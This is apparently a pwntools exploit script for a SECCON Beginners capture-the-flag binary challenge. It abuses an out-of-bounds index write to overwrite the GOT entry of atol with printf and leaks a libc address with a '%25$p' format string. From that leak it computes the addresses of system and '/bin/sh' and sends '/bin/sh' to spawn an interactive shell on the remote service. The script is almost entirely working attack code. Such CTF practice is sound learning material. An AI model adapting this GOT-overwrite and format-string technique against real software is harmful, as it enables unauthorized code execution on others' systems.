from pwn import *
import tty
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'es.quals.beginners.seccon.jp'
PORT = 9003

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


r = start()
if args.D:
    debug(r, [0x797, 0x821])
rdi = 0x00400893

def inp(idx, value, iraw=False, raw=False):
    if iraw == False:
        r.sendlineafter('index: ', str(idx))
    else:
        r.sendafter('index: ', idx)
    if raw == False:
        r.sendlineafter('value: ', str(value))
    else:
        r.sendafter('value: ', value)

inp(-2, elf.got.atol-8)
inp(0, "A"*8+p64(elf.plt.printf), raw = True)

inp(0, '%25$p')
leak = int(r.recvuntil('\n')[:-1],16)
dbg("leak")
base = leak - 0x21b97
system = base + 0x4f440
binsh = base + 0x1b3e9a


inp(0, 'A'*8+p64(system), raw=True)
r.sendafter('index: ', "/bin/sh\x00")

# inp(11, elf.plt.printf)
# inp(12, elf.sym.main)


r.interactive()
r.close()
